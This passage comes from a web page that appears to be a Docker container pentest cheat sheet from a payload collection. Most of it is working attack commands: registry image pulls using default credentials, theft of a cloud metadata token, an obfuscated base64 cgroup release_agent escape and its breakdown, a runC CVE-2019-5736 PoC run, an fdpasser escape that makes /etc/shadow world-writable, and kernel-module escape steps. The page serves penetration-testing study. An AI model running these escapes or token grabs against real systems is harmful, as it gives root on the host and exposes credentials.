</span><span class="n">curl</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nt">-k</span><span class="w"> </span><span class="nt">--user</span><span class="w"> </span><span class="s1">'admin:admin'</span><span class="w"> </span><span class="s1">'http://docker.registry.local/v2/wordpress-image/blobs/sha256:c314c5effb61c9e9c534c81a6970590ef4697b8439ec6bb4ab277833f7315058'</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">out.tar.gz</span><span class="w">
</span><span class="c"># automated download</span><span class="w">
</span><span class="n">https://github.com/NotSoSecure/docker_fetch/</span><span class="w">
</span><span class="nx">python</span><span class="w"> </span><span class="nx">/opt/docker_fetch/docker_image_fetch.py</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">http://admin:admin</span><span class="err">@</span><span class="nx">docker.registry.local</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Access a private registry and start a container with one of its image</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="n">docker</span><span class="w"> </span><span class="nx">login</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">admin</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">admin</span><span class="w"> </span><span class="nx">docker.registry.local</span><span class="w">
</span><span class="n">docker</span><span class="w"> </span><span class="nx">pull</span><span class="w"> </span><span class="nx">docker.registry.local/wordpress-image</span><span class="w">
</span><span class="n">docker</span><span class="w"> </span><span class="nx">run</span><span class="w"> </span><span class="nt">-it</span><span class="w"> </span><span class="nx">docker.registry.local/wordpress-image</span><span class="w"> </span><span class="nx">/bin/bash</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Access a private registry using OAuth Token from Google</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="n">curl</span><span class="w"> </span><span class="nx">http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/email</span><span class="w">
</span><span class="n">curl</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nx">http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token</span><span class="w"> 
</span><span class="n">docker</span><span class="w"> </span><span class="nx">login</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">email</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">oauth2accesstoken</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="s2">"&lt;access token&gt;"</span><span class="w"> </span><span class="nx">https://gcr.io</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="exploit-privileged-container-abusing-the-linux-cgroup-v1">Exploit privileged container abusing the Linux cgroup v1</h2>

<p>Prerequisite (at least one):</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">--privileged</code></li>
  <li><code class="language-plaintext highlighter-rouge">--security-opt apparmor=unconfined --cap-add=SYS_ADMIN</code> flags.</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">docker</span><span class="w"> </span><span class="nx">run</span><span class="w"> </span><span class="nt">--rm</span><span class="w"> </span><span class="nt">-it</span><span class="w"> </span><span class="nt">--cap-add</span><span class="o">=</span><span class="n">SYS_ADMIN</span><span class="w"> </span><span class="nt">--security-opt</span><span class="w"> </span><span class="nx">apparmor</span><span class="o">=</span><span class="n">unconfined</span><span class="w"> </span><span class="nx">ubuntu</span><span class="w"> </span><span class="nx">bash</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s1">'echo "cm5kX2Rpcj0kKGRhdGUgKyVzIHwgbWQ1c3VtIHwgaGVhZCAtYyAxMCkKbWtkaXIgL3RtcC9jZ3JwICYmIG1vdW50IC10IGNncm91cCAtbyByZG1hIGNncm91cCAvdG1wL2NncnAgJiYgbWtkaXIgL3RtcC9jZ3JwLyR7cm5kX2Rpcn0KZWNobyAxID4gL3RtcC9jZ3JwLyR7cm5kX2Rpcn0vbm90aWZ5X29uX3JlbGVhc2UKaG9zdF9wYXRoPWBzZWQgLW4gJ3MvLipccGVyZGlyPVwoW14sXSpcKS4qL1wxL3AnIC9ldGMvbXRhYmAKZWNobyAiJGhvc3RfcGF0aC9jbWQiID4gL3RtcC9jZ3JwL3JlbGVhc2VfYWdlbnQKY2F0ID4gL2NtZCA8PCBfRU5ECiMhL2Jpbi9zaApjYXQgPiAvcnVubWUuc2ggPDwgRU9GCnNsZWVwIDMwIApFT0YKc2ggL3J1bm1lLnNoICYKc2xlZXAgNQppZmNvbmZpZyBldGgwID4gIiR7aG9zdF9wYXRofS9vdXRwdXQiCmhvc3RuYW1lID4+ICIke2hvc3RfcGF0aH0vb3V0cHV0IgppZCA+PiAiJHtob3N0X3BhdGh9L291dHB1dCIKcHMgYXh1IHwgZ3JlcCBydW5tZS5zaCA+PiAiJHtob3N0X3BhdGh9L291dHB1dCIKX0VORAoKIyMgTm93IHdlIHRyaWNrIHRoZSBkb2NrZXIgZGFlbW9uIHRvIGV4ZWN1dGUgdGhlIHNjcmlwdC4KY2htb2QgYSt4IC9jbWQKc2ggLWMgImVjaG8gXCRcJCA+IC90bXAvY2dycC8ke3JuZF9kaXJ9L2Nncm91cC5wcm9jcyIKIyMgV2FpaWlpaXQgZm9yIGl0Li4uCnNsZWVwIDYKY2F0IC9vdXRwdXQKZWNobyAi4oCiPygowq/CsMK3Ll8u4oCiIHByb2ZpdCEg4oCiLl8uwrfCsMKvKSnYn+KAoiIK" | base64 -d | bash -'</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Exploit breakdown :</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre><span class="c"># On the host</span><span class="w">
</span><span class="n">docker</span><span class="w"> </span><span class="nx">run</span><span class="w"> </span><span class="nt">--rm</span><span class="w"> </span><span class="nt">-it</span><span class="w"> </span><span class="nt">--cap-add</span><span class="o">=</span><span class="n">SYS_ADMIN</span><span class="w"> </span><span class="nt">--security-opt</span><span class="w"> </span><span class="nx">apparmor</span><span class="o">=</span><span class="n">unconfined</span><span class="w"> </span><span class="nx">ubuntu</span><span class="w"> </span><span class="nx">bash</span><span class="w">
 
</span><span class="c"># In the container</span><span class="w">
</span><span class="n">mkdir</span><span class="w"> </span><span class="nx">/tmp/cgrp</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">mount</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">cgroup</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">rdma</span><span class="w"> </span><span class="nx">cgroup</span><span class="w"> </span><span class="nx">/tmp/cgrp</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">mkdir</span><span class="w"> </span><span class="nx">/tmp/cgrp/x</span><span class="w">
 
</span><span class="n">echo</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/tmp/cgrp/x/notify_on_release</span><span class="w">
</span><span class="n">host_path</span><span class="o">=</span><span class="err">`</span><span class="n">sed</span><span class="w"> </span><span class="nt">-n</span><span class="w"> </span><span class="s1">'s/.*\perdir=\([^,]*\).*/\1/p'</span><span class="w"> </span><span class="nx">/etc/mtab</span><span class="se">`
</span><span class="nx">echo</span><span class="w"> </span><span class="s2">"</span><span class="nv">$host_path</span><span class="s2">/cmd"</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/tmp/cgrp/release_agent</span><span class="w">
 
</span><span class="n">echo</span><span class="w"> </span><span class="s1">'#!/bin/sh'</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/cmd</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="s2">"ps aux &gt; </span><span class="nv">$host_path</span><span class="s2">/output"</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">/cmd</span><span class="w">
</span><span class="n">chmod</span><span class="w"> </span><span class="nx">a</span><span class="o">+</span><span class="nx">x</span><span class="w"> </span><span class="nx">/cmd</span><span class="w">
 
</span><span class="n">sh</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"echo \</span><span class="err">$</span><span class="s2">\</span><span class="err">$</span><span class="s2"> &gt; /tmp/cgrp/x/cgroup.procs"</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="breaking-out-of-docker-via-runc">Breaking out of Docker via runC</h2>

<blockquote>
  <p>The vulnerability allows a malicious container to (with minimal user interaction) overwrite the host runc binary and thus gain root-level code execution on the host. The level of user interaction is being able to run any command … as root within a container in either of these contexts: Creating a new container using an attacker-controlled image. Attaching (docker exec) into an existing container which the attacker had previous write access to.  - Vulnerability overview by the runC team</p>
</blockquote>

<p>Exploit for CVE-2019-5736 : https://github.com/twistlock/RunC-CVE-2019-5736</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="err">$</span><span class="w"> </span><span class="n">docker</span><span class="w"> </span><span class="nx">build</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">cve-2019-5736:malicious_image_POC</span><span class="w"> </span><span class="o">.</span><span class="nx">/RunC-CVE-2019-5736/malicious_image_POC</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">docker</span><span class="w"> </span><span class="nx">run</span><span class="w"> </span><span class="nt">--rm</span><span class="w"> </span><span class="nx">cve-2019-5736:malicious_image_POC</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="breaking-out-of-containers-using-a-device-file">Breaking out of containers using a device file</h2>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="n">https://github.com/FSecureLABS/fdpasser</span><span class="w">
</span><span class="nx">In</span><span class="w"> </span><span class="nx">container</span><span class="p">,</span><span class="w"> </span><span class="nx">as</span><span class="w"> </span><span class="nx">root:</span><span class="w"> </span><span class="o">.</span><span class="nx">/fdpasser</span><span class="w"> </span><span class="nx">recv</span><span class="w"> </span><span class="nx">/moo</span><span class="w"> </span><span class="nx">/etc/shadow</span><span class="w">
</span><span class="n">Outside</span><span class="w"> </span><span class="nx">container</span><span class="p">,</span><span class="w"> </span><span class="nx">as</span><span class="w"> </span><span class="nx">UID</span><span class="w"> </span><span class="nx">1000:</span><span class="w"> </span><span class="o">.</span><span class="nx">/fdpasser</span><span class="w"> </span><span class="nx">send</span><span class="w"> </span><span class="nx">/proc/</span><span class="err">$</span><span class="p">(</span><span class="n">pgrep</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="s2">"sleep 1337"</span><span class="p">)</span><span class="n">/root/moo</span><span class="w">
</span><span class="nx">Outside</span><span class="w"> </span><span class="nx">container:</span><span class="w"> </span><span class="nx">ls</span><span class="w"> </span><span class="nt">-la</span><span class="w"> </span><span class="nx">/etc/shadow</span><span class="w">
</span><span class="n">Output:</span><span class="w"> </span><span class="nt">-rwsrwsrwx</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nx">root</span><span class="w"> </span><span class="nx">shadow</span><span class="w"> </span><span class="nx">1209</span><span class="w"> </span><span class="nx">Oct</span><span class="w"> </span><span class="nx">10</span><span class="w">  </span><span class="nx">2019</span><span class="w"> </span><span class="nx">/etc/shadow</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="breaking-out-of-docker-via-kernel-modules-loading">Breaking out of Docker via kernel modules loading</h2>

<blockquote>
  <p>When privileged Linux containers attempt to load kernel modules, the modules are loaded into the host’s kernel (because there is only <em>one</em> kernel, unlike VMs). This provides a route to an easy container escape.</p>
</blockquote>

<p>Exploitation:</p>
<ul>
  <li>Clone the repository : <code class="language-plaintext highlighter-rouge">git clone https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.8_privileged_container_escaping</code></li>
  <li>Build with <code class="language-plaintext highlighter-rouge">make</code></li>
  <li>Start a privileged docker container with <code class="language-plaintext highlighter-rouge">docker run -it --privileged --hostname docker --mount "type=bind,src=$PWD,dst=/root" ubuntu</code></li>
  <li><code class="language-plaintext highlighter-rouge">cd /root</code> in the new container</li>
  <li>Insert the kernel module with <code class="language-plaintext highlighter-rouge">./escape</code></li>
  <li>Run <code class="language-plaintext highlighter-rouge">./execute</code>!</li>
</ul>

<p>Unlike other techniques, this module doesn’t contain any syscalls hooks, but merely creates two new proc files; <code class="language-plaintext highlighter-rouge">/proc/escape</code> and <code class="language-plaintext highlighter-rouge">/proc/output</code>.</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">/proc/escape</code> only answers to write requests and simply executes anything that’s passed to it via <a href="https://www.kernel.org/doc/htmldocs/kernel-api/API-call-usermodehelper.html"><code class="language-plaintext highlighter-rouge">call_usermodehelper()</code></a>.</li>
  <li><code class="language-plaintext highlighter-rouge">/proc/output</code> just takes input and stores it in a buffer when written to, then returns that buffer when it’s read from - essentially acting a like a file that both the container and the host can read/write to.</li>
</ul>

<p>The clever part is that anything we write to <code class="language-plaintext highlighter-rouge">/proc/escape</code> gets sandwiched into <code class="language-plaintext highlighter-rouge">/bin/sh -c &lt;INPUT&gt; &gt; /proc/output</code>. This means that the command is run under <code class="language-plaintext highlighter-rouge">/bin/sh</code> and the output is redirected to <code class="language-plaintext highlighter-rouge">/proc/output</code>, which we can then read from within the container.</p>

<p>Once the module is loaded, you can simply <code class="language-plaintext highlighter-rouge">echo "cat /etc/passwd" &gt; /proc/escape</code> and then get the result via <code class="language-plaintext highlighter-rouge">cat /proc/output</code>. Alternatively, you can use the <code class="language-plaintext highlighter-rouge">execute</code> program to give yourself a makeshift shell (albeit an extraordinarily basic one).</p>

<p>The only caveat is that we cannot be sure that the container has <code class="language-plaintext highlighter-rouge">kmod</code> installed (which provides <code class="language-plaintext highlighter-rouge">insmod</code> and <code class="language-plaintext highlighter-rouge">rmmod</code>). To overcome this, after building the kernel module, we load it’s byte array into a C program, which then uses the <code class="language-plaintext highlighter-rouge">init_module()</code> syscall to load the module into the kernel without needing <code class="language-plaintext highlighter-rouge">insmod</code>. If you’re interested, take a look at the Makefile.</p>

<h2 id="references">References</h2>

<ul>
  <li><a href="https://hackarandas.com/blog/2020/03/17/hacking-docker-remotely/">Hacking Docker Remotely - 17 March 2020 - ch0ks</a></li>
  <li><a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/">Understanding Docker container escapes - JULY 19, 2019 - Trail of Bits</a></li>
  <li><a href="https://hackernoon.com/capturing-all-the-flags-in-bsidessf-ctf-by-pwning-our-infrastructure-3570b99b4dd0">Capturing all the flags in BSidesSF CTF by pwning our infrastructure - Hackernoon</a></li>
  <li><a href="https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/">Breaking out of Docker via runC – Explaining CVE-2019-5736 - Yuval Avrahami - February 21, 2019</a></li>
  <li><a href="https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html">CVE-2019-5736: Escape from Docker and Kubernetes containers to root on host - dragonsector.pl</a></li>
  <li><a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Docker_Security_Cheat_Sheet.md">OWASP - Docker Security CheatSheet</a></li>
  <li><a href="https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/">Anatomy of a hack: Docker Registry - NotSoSecure - April 6, 2017</a></li>
  <li><a href="https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.8_privileged_container_escaping">Linux Kernel Hacking 3.8: Privileged Container Escapes - Harvey Phillips @xcellerator</a></li>
</ul>


      </div>

      <div class="post-tail-wrapper text-muted">

        <!-- categories -->
        
        <div class="post-meta mb-3">
          <i class="far fa-folder-open fa-fw mr-1"></i>
          
            <a href='/categories/methodology-and-resource/'>Methodology and Resource</a>,
            <a href='/categories/docker/'>Docker</a>
        </div>
        

        <!-- tags -->
        
        <div class="post-tags">
          <i class="fa fa-tags fa-fw mr-1"></i>
          
          <a href="/tags/pentest/"
            class="post-tag no-text-decoration" >Pentest</a>
          
          </div>
        

        <div class="post-tail-bottom
          d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
          
          <div class="license-wrapper">
            This post is licensed under
            <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a>
            by the author.
          </div>
          

          <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Container   docker pentest - PayloadsAllTheThings&url=http://localhost:4000/Container-Docker-Pentest/" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Container   docker pentest - PayloadsAllTheThings&u=http://localhost:4000/Container-Docker-Pentest/" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://telegram.me/share?text=Container   docker pentest - PayloadsAllTheThings&url=http://localhost:4000/Container-Docker-Pentest/" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i class="fa-fw fas fa-link small" onclick="copyLink()"
        data-toggle="tooltip" data-placement="top" title="Copy link"></i>

  </span>
</div>


        </div><!-- .post-tail-bottom -->

      </div><!-- div.post-tail -->

    </div> <!-- .post -->


  </div> <!-- #post-wrapper -->

  

  

  <!--
  The Pannel on right side (Desktop views)
-->

<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

  <div class="access">

  














  

  















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



  
    <div id="access-tags">
      <span>Trending Tags</span>
      <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

      
        
        <a class="post-tag" href="/tags/injection/">Injection</a>
      
        
        <a class="post-tag" href="/tags/database/">Database</a>
      
        
        <a class="post-tag" href="/tags/server/">Server</a>
      
        
        <a class="post-tag" href="/tags/network/">Network</a>
      
        
        <a class="post-tag" href="/tags/windows/">Windows</a>
      
        
        <a class="post-tag" href="/tags/exploits/">Exploits</a>
      
        
        <a class="post-tag" href="/tags/shell/">Shell</a>
      
        
        <a class="post-tag" href="/tags/sql/">SQL</a>
      
        
        <a class="post-tag" href="/tags/xss/">XSS</a>
      
        
        <a class="post-tag" href="/tags/attack/">Attack</a>
      

      </div>
    </div>
  
  </div> <!-- .access -->

  
    <!-- BS-toc.js will be loaded at medium priority -->
    <script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>
    <div id="toc-wrapper" class="pl-0 pr-4 mb-5">
      <span class="pl-3 pt-2 mb-2">Contents</span>
      <nav id="toc" data-toggle="toc"></nav>
    </div>
  

</div> <!-- #panel-wrapper -->


</div> <!-- .row -->

<div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

    <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->






  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/Windows-Post-Exploitation-Koadic/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Mar  7, 2019
  

  <i class="unloaded">2019-03-07T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Koadic C3 COM Command & Control - JScript RAT</h3>
            <div class="text-muted small">
              <p>
                





                
  Windows post-exploitation rootkit similar to other penetration testing tools such as Meterpreter and Powershell Empire.


Installation

git clone https://github.com/zerosum0x0/koadic
git submodu...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/Reverse-Shell-Cheatsheet/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Apr 26, 2021
  

  <i class="unloaded">2021-04-26T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Reverse Shell Cheat Sheet</h3>
            <div class="text-muted small">
              <p>
                





                Summary


  Reverse Shell
    
      Awk
      Automatic Reverse Shell Generator
      Bash TCP
      Bash UDP
      C
      Dart
      Golang
      Groovy Alternative 1
      Groovy
      Java Alt...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/Cloud-AWS-Pentest/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    May  1, 2021
  

  <i class="unloaded">2021-05-01T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>AWS</h3>
            <div class="text-muted small">
              <p>
                





                
